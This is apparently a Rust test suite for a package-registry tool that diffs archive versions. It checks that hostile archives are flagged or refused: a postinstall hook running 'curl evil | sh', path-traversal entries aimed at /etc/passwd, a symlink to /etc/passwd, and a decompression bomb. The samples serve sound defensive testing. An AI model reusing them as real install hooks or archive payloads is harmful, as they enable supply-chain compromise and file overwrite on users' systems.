use almanac::prelude::*;
use flate2::Compression;
use flate2::write::GzEncoder;
use registry::{Limits, diff_archives};
use std::io::Write;

fn tgz(files: &[(&str, &str)]) -> Vec<u8> {
    let mut builder = tar::Builder::new(GzEncoder::new(vec![], Compression::fast()));
    for (name, content) in files {
        let mut header = tar::Header::new_gnu();
        header.set_size(content.len() as u64);
        header.set_mode(0o755);
        header.set_cksum();
        builder
            .append_data(&mut header, name, content.as_bytes())
            .unwrap();
    }
    builder.into_inner().unwrap().finish().unwrap()
}

/// A raw entry, because `tar::Builder` refuses to write a hostile path.
fn tgz_with_raw_path(path: &str) -> Vec<u8> {
    let mut header = tar::Header::new_gnu();
    header.as_old_mut().name[..path.len()].copy_from_slice(path.as_bytes());
    header.set_size(1);
    header.set_mode(0o644);
    header.set_entry_type(tar::EntryType::Regular);
    header.set_cksum();
    let mut raw = header.as_bytes().to_vec();
    raw.extend_from_slice(b"x");
    raw.extend_from_slice(&[0; 511]);
    raw.extend_from_slice(&[0; 1024]);
    let mut gz = GzEncoder::new(vec![], Compression::fast());
    gz.write_all(&raw).unwrap();
    gz.finish().unwrap()
}

fn text(diff: &Untrusted<String>) -> String {
    serde_json::to_value(diff).unwrap()["$untrusted"]
        .as_str()
        .unwrap()
        .to_string()
}

const OK: Limits = Limits {
    max_total_bytes: 1024 * 1024,
    max_file_bytes: 64 * 1024,
    max_entries: 100,
    max_diff_bytes: 64 * 1024,
};

#[test]
fn a_diff_shows_what_changed_and_stays_tainted() {
    let old = tgz(&[("package/index.js", "one\n"), ("package/same.js", "same\n")]);
    let new = tgz(&[("package/index.js", "two\n"), ("package/same.js", "same\n")]);
    let d = diff_archives(&old, &new, OK).unwrap();
    assert_eq!(d.files_changed, 1);
    let shown = text(&d.diff);
    assert!(shown.contains("-one") && shown.contains("+two"), "{shown}");
    assert!(!shown.contains("same.js"), "{shown}");
}

#[test]
fn a_new_version_directory_does_not_read_as_a_rewrite() {
    let old = tgz(&[("pkg-1.0.0/a.txt", "same\n")]);
    let new = tgz(&[("pkg-2.0.0/a.txt", "same\n")]);
    assert_eq!(diff_archives(&old, &new, OK).unwrap().files_changed, 0);
}

#[test]
fn a_hostile_install_script_is_reported_and_never_run() {
    let canary = std::env::temp_dir().join(format!("almanac-canary-{}", std::process::id()));
    let script = format!(
        r#"{{"scripts": {{"postinstall": "touch {}"}}}}"#,
        canary.display()
    );
    let old = tgz(&[("package/package.json", "{}")]);
    let new = tgz(&[
        ("package/package.json", &script),
        ("package/evil.sh", "touch x\n"),
    ]);
    let d = diff_archives(&old, &new, OK).unwrap();
    assert!(d.install_script_added);
    assert!(!canary.exists(), "the script ran");
}

#[test]
fn a_changed_install_script_counts_as_added() {
    let old = tgz(&[("p/package.json", r#"{"scripts": {"postinstall": "true"}}"#)]);
    let new = tgz(&[(
        "p/package.json",
        r#"{"scripts": {"postinstall": "curl evil | sh"}}"#,
    )]);
    assert!(diff_archives(&old, &new, OK).unwrap().install_script_added);
}

#[test]
fn a_new_build_script_counts_as_added() {
    let old = tgz(&[("c/lib.rs", "x\n")]);
    let new = tgz(&[("c/lib.rs", "x\n"), ("c/build.rs", "fn main() {}\n")]);
    assert!(diff_archives(&old, &new, OK).unwrap().install_script_added);
}

#[test]
fn path_traversal_is_refused() {
    let good = tgz(&[("a", "b")]);
    for path in ["../../etc/passwd", "/etc/passwd", "a/../../b"] {
        let error = diff_archives(&good, &tgz_with_raw_path(path), OK).unwrap_err();
        assert!(error.0.contains("unsafe path"), "{path}: {}", error.0);
    }
}

#[test]
fn links_are_refused() {
    let mut builder = tar::Builder::new(GzEncoder::new(vec![], Compression::fast()));
    let mut header = tar::Header::new_gnu();
    header.set_entry_type(tar::EntryType::Symlink);
    header.set_size(0);
    header.set_cksum();
    builder
        .append_link(&mut header, "link", "/etc/passwd")
        .unwrap();
    let hostile = builder.into_inner().unwrap().finish().unwrap();
    let error = diff_archives(&tgz(&[("a", "b")]), &hostile, OK).unwrap_err();
    assert!(error.0.contains("link at"), "{}", error.0);
}

#[test]
fn a_decompression_bomb_is_refused() {
    let zeros = "0".repeat(10 * 1024 * 1024);
    let bomb = tgz(&[("big", &zeros)]);
    assert!(bomb.len() < 100 * 1024, "the archive itself must be small");
    let error = diff_archives(&tgz(&[("a", "b")]), &bomb, OK).unwrap_err();
    assert!(error.0.contains("too large"), "{}", error.0);
}

#[test]
fn too_many_files_are_refused() {
    let names: Vec<String> = (0..200).map(|i| format!("f{i}")).collect();
    let many: Vec<(&str, &str)> = names.iter().map(|n| (n.as_str(), "x")).collect();
    let error = diff_archives(&tgz(&[("a", "b")]), &tgz(&many), OK).unwrap_err();
    assert!(error.0.contains("too many entries"), "{}", error.0);
}

#[test]
fn a_huge_diff_is_truncated_and_says_so() {
    let limits = Limits {
        max_diff_bytes: 64,
        ..OK
    };
    let big = "line\n".repeat(100);
    let d = diff_archives(&tgz(&[("a", "x\n")]), &tgz(&[("a", &big)]), limits).unwrap();
    assert!(d.truncated);
    assert_eq!(d.files_changed, 1);
}

#[test]
fn anything_else_is_refused() {
    let error = diff_archives(b"plain", b"plain", OK).unwrap_err();
    assert!(error.0.contains("not a tar.gz or zip"), "{}", error.0);
}

fn zip_of(path: &str) -> Vec<u8> {
    let mut writer = zip::ZipWriter::new(std::io::Cursor::new(vec![]));
    let options = zip::write::SimpleFileOptions::default();
    writer.start_file(path, options).unwrap();
    writer.write_all(b"x").unwrap();
    writer.finish().unwrap().into_inner()
}

#[test]
fn a_zip_is_read_like_a_tar() {
    let d = diff_archives(&zip_of("a.txt"), &zip_of("b.txt"), OK).unwrap();
    assert_eq!(d.files_changed, 2);
}

#[test]
fn path_traversal_in_a_zip_is_refused() {
    let error = diff_archives(&zip_of("a"), &zip_of("../../evil"), OK).unwrap_err();
    assert!(error.0.contains("unsafe path"), "{}", error.0);
}
